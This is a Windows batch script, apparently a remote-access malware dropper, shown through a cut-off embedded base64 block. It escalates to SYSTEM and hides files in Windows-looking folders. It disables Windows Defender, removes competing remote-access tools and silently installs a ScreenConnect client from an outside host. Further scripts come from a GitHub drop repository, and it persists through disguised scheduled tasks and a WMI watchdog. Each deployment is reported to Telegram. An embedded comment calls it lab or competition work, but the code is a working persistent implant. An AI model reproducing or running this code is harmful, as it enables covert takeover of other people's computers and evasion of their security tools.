@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O33 - IDENTVER=7 root tasks + CRLF + Datto keep
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O33 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O33b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O33" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O33 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O33 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
echo embed_extract_done>>"%LOG%"

REM O33: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M23" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S6" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T13" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L12" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf>>"%LOG%"
  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O33: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
REM O33/L12: IDENTVER=7 ROOT-level task names (nested Microsoft\Windows Create = Access Denied)
REM (existence-only Query previously false-OKed Windows Diagnosis\Scheduled).
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=\WerQueueSync"
if not defined TASK_B set "TASK_B=\PlaServerHealth"
if not defined TASK_C set "TASK_C=\WdiHostProxy"
if not defined TASK_D set "TASK_D=\TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "%TASK_A%" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_B%" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_C%" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_D%" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "%TASK_A%" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O33 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O33 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIw
MjYwODAyTTIzDQpyZW0gIFBlcnNpc3RlbnQgd2F0Y2hkb2cgLSBpZGVudGl0eS1hd2FyZSAoYW50
aS1zaWduYXR1cmUpLCBtdXR1YWwNCnJlbSAgV01JK3NjaHRhc2tzIGNoYWlucywgTVNJIGZhbGxi
YWNrIGNoYWluLCBzdGF0ZS5qc29uLCBkaWdlc3QgSEIuDQpyZW0gIEF1dGhvcml6ZWQgaW50ZXJu
YWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRpdGlvbiBzY29wZSBvbmx5Lg0KcmVtIOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkA0Kc2V0bG9jYWwgRW5hYmxlRGVsYXllZEV4cGFuc2lvbg0KDQpzZXQgIktFRVBf
RlA9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiQUxUX0ZQPWY4NjFjODE0MGQ0NTM0MjciDQpzZXQg
IldEPUM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0K
c2V0ICJFVEw9QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2Fj
aGUiDQpzZXQgIkxPRz0lV0QlXG93bl9tb24ubG9nIg0Kc2V0ICJTVEFURT0lV0QlXG93bl9tb24u
c3RhdGUiDQpzZXQgIkhCRkxBRz0lV0QlXGhiLmZsYWciDQpzZXQgIkNVUkw9JVN5c3RlbVJvb3Ql
XFN5c3RlbTMyXGN1cmwuZXhlIg0Kc2V0ICJURz1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVu
dC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi90Z19yZXBvcnQucHMxP3Q9JVJBTkRPTSUl
UkFORE9NJSINCnNldCAiVEcyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9n
aXRodWItZHJvcEBtYWluL3RnX3JlcG9ydC5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJP
V05TRUM9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1k
cm9wL21haW4vb3duX3NlY3VyZS5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05TRUMy
PWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293
bl9zZWN1cmUuY21kP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOTU9OPWh0dHBzOi8vcmF3
LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9tb24u
Y21kP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOTU9OMj1odHRwczovL2Nkbi5qc2RlbGl2
ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00l
JVJBTkRPTSUiDQpzZXQgIk9XTkxJQj1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20v
eG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25fbGliLnBzMT90PSVSQU5ET00lJVJBTkRPTSUi
DQpzZXQgIk9XTkxJQjI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1
Yi1kcm9wQG1haW4vb3duX2xpYi5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJNU0lfVVJM
PWh0dHBzOi8vdWkuc2V2cnouY29tL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9l
PUFjY2VzcyZ5PUd1ZXN0Ig0Kc2V0ICJNU0lfUEtHMT1odHRwczovL3Jhdy5naXRodWJ1c2VyY29u
dGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9wa2cubXNpIg0Kc2V0ICJNU0lfUEtH
Mj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9w
a2cubXNpIg0Kc2V0ICJNU0k9JVByb2dyYW1EYXRhJVxTY3JlZW5Db25uZWN0LkNsaWVudFNldHVw
Lm1zaSINCnNldCAiTVNJQ0FDSEU9JVdEJVxwa2cubXNpIg0KDQppZiBub3QgZXhpc3QgIiVXRCUi
IG1kICIlV0QlIiAyPm51bA0KaWYgbm90IGV4aXN0ICIlTE9HJSIgdHlwZSBudWw+IiVMT0clIiAy
Pm51bA0KDQpzZXQgIk1PTlZFUj1NMjMiDQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSIN
CmZvciAvZiAidG9rZW5zPTEtMyBkZWxpbXM9LyAiICUlYSBpbiAoIiVkYXRlJSIpIGRvIHNldCAi
RFQ9JWRhdGUlICV0aW1lJSINCmVjaG8uPj4iJUxPRyUiDQplY2hvIOKUgOKUgCB0aWNrICFEVCEg
W3ZlciAlTU9OVkVSJV0g4pSA4pSAPj4iJUxPRyUiDQpzZXQgIkNPVU5UPTAiDQpzZXQgIklOU1RB
